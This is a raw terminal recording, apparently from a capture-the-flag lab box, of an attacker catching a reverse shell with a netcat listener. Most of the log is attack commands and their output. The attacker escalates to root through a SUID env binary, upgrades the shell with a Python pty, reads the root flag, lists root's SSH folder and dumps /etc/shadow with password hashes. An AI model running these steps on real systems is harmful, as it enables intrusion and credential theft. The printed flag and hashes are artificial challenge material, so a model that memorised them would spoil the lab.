@@ -1,0 +1,113 @@
+Script started on 2025-04-06 20:30:19+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 10714
+bash: cannot set terminal process group (1704): Inappropriate ioctl for device
+[Kbash: no job control in this shell
+namelessone@anonymous:~$ [Knamelessone@anonymous:~$ [K[?2004hnamelessone@anonymous:~$ [7m/bin/sh -p[27m/bin/sh -p[12@[7m/usr/bin/env[27m[1@/usr/bin/env [1@s[1@u[1@d[1@o[1@ [1P[1P[1P[1P[1P[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h/usr/bin/env /bin/sh -p
+[K/usr/bin/env /bin/sh -p[K/usr/bin/env /bin/sh -p[K/usr/bin/env /bin/sh -p
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+[K[K[?2004hsudo [7m/usr/bin/env /bin/sh -p[27m[7msudo [27m/usr/bin/env /bin/sh -p[?2004l[K[?2004hsudo /usr/bin/env /bin/sh -p
+[Ksudo[Ksudo[Ksudo: no tty present and no askpass program specified
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[Knamelessone@anonymous:~$ [Knamelessone@anonymous:~$ [K[?2004hnamelessone@anonymous:~$ sudo [7m/usr/bin/env /bin/sh -p[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7msudo [27m/usr/bin/env /bin/sh -p[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo /usr/bin/env /bin/sh -p
+[Ksudo /usr/bin/env /bin/sh -p[Ksudo /usr/bin/env /bin/sh -p[Ksudo /usr/bin/env /bin/sh -p
+sudo: no tty present and no askpass program specified
+namelessone@anonymous:~$ [Knamelessone@anonymous:~$ [K[?2004hnamelessone@anonymous:~$ [7m/usr/bin/env /bin/sh -p[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h/usr/bin/env /bin/sh -p
+[K/usr/bin/env /bin/sh -p[K/usr/bin/env /bin/sh -p[K/usr/bin/env /bin/sh -p
+[K[K[?2004hwhoami[?2004l[K[?2004hwhoami
+[Kroot
+[K[K[?2004hcd /root[?2004l[K[?2004hcd /root
+[K[K[?2004hls[?2004l[K[?2004hls
+[Kroot.txt
+[K[K[?2004hwhich python3[?2004l[K[?2004hwhich python3
+[K/usr/bin/python3
+[K[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kbash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ id[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hid
+[Kid[Kid[Kid
+uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ whoami[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hwhoami
+[Kwhoami[Kwhoami[Kwhoami
+namelessone
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ [7m/usr/bin/env /bin/sh -p[27m[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004h/usr/bin/env /bin/sh -p
+[K/usr/bin/env /bin/sh -p[K/usr/bin/env /bin/sh -p[K/usr/bin/env /bin/sh -p
+# [K# [K[?2004h# id[?2004l[C[C[K[?2004hid
+[Kid
+[Kuid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+# [K# [K[?2004h# whoami[C[C[?2004l[C[C[K[?2004hwhoami
+[Kwhoami
+[Kroot
+# [K# [K[?2004h# ls[?2004l[C[C[K[?2004hls
+[Kls
+[Kroot.txt
+# [K# [K[?2004h# cat root.txt[C[C[?2004l[C[C[K[?2004hcat root.txt
+[Kcat root.txt
+[K4d930091c31a622a7ed10f27999af363
+# [K# [K[?2004h# l s-al[K[K[K[K[Ks -al[C[C[?2004l[C[C[K[?2004hls -al
+[Kls -al
+[Ktotal 60
+drwx------  6 root root  4096 May 17  2020 .
+drwxr-xr-x 24 root root  4096 May 12  2020 ..
+lrwxrwxrwx  1 root root     9 May 11  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
+drwx------  2 root root  4096 May 11  2020 .cache
+drwx------  3 root root  4096 May 11  2020 .gnupg
+drwxr-xr-x  3 root root  4096 May 11  2020 .local
+-rw-r--r--  1 root root   148 Aug 17  2015 .profile
+-rw-r--r--  1 root root    33 May 11  2020 root.txt
+-rw-r--r--  1 root root    66 May 11  2020 .selected_editor
+drwx------  2 root root  4096 May 11  2020 .ssh
+-rw-------  1 root root 13795 May 17  2020 .viminfo
+-rw-------  1 root root    55 May 14  2020 .Xauthority
+# [K# [K[?2004h# cd .ssh[C[C[?2004l[C[C[K[?2004hcd .ssh
+[Kcd .ssh
+# [K# [K[?2004h# ls -al[C[C[?2004l[C[C[K[?2004hls -al
+[Kls -al
+[Ktotal 12
+drwx------ 2 root root 4096 May 11  2020 .
+drwx------ 6 root root 4096 May 17  2020 ..
+-rw------- 1 root root  568 Jun  4  2020 authorized_keys
+# [K# [K[?2004h# cat /etc/shadp[Kow[C[C[?2004l[C[C[K[?2004hcat /etc/shadow
+[Kcat /etc/shadow
+[Kroot:$6$dOoqZ3J0$TjcJJhU0XdOez/8IkI5Dryhjv8Gvuu1uAyk3ZicfvPUbNWgZbPfy/Ugk8qFkNFpeiiqwozg9jd3uH0tRmlX5f1:18417:0:99999:7:::
+daemon:*:18295:0:99999:7:::
+bin:*:18295:0:99999:7:::
+sys:*:18295:0:99999:7:::
+sync:*:18295:0:99999:7:::
+games:*:18295:0:99999:7:::
+man:*:18295:0:99999:7:::
+lp:*:18295:0:99999:7:::
+mail:*:18295:0:99999:7:::
+news:*:18295:0:99999:7:::
+uucp:*:18295:0:99999:7:::
+proxy:*:18295:0:99999:7:::
+www-data:*:18295:0:99999:7:::
+backup:*:18295:0:99999:7:::
+list:*:18295:0:99999:7:::
+irc:*:18295:0:99999:7:::
+gnats:*:18295:0:99999:7:::
+nobody:*:18295:0:99999:7:::
+systemd-network:*:18295:0:99999:7:::
+systemd-resolve:*:18295:0:99999:7:::
+syslog:*:18295:0:99999:7:::
+messagebus:*:18295:0:99999:7:::
+_apt:*:18295:0:99999:7:::
+lxd:*:18295:0:99999:7:::
+uuidd:*:18295:0:99999:7:::
+dnsmasq:*:18295:0:99999:7:::
+landscape:*:18295:0:99999:7:::
+pollinate:*:18295:0:99999:7:::
+namelessone:$6$V/H25roj$id.WW.Fjmcf6dveZ/BWDIAMhkOQT2YPdY3XcTLFFVsHdLusZ7Xf3Y9zshoTOiUsMviu.8Mm7FfYtQOjd.B9Up/:18395:0:99999:7:::
+sshd:*:18393:0:99999:7:::
+ftp:*:18396:0:99999:7:::
+# [K# [K[?2004h# exit[C[C[?2004l[C[C[K[?2004hexit
+[Kexit
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit[Kexit[Kexit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[Knamelessone@anonymous:~$ [Knamelessone@anonymous:~$ [K[?2004hnamelessone@anonymous:~$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[?2004l
+Script done on 2025-04-06 20:36:28+03:00 [COMMAND_EXIT_CODE="0"]
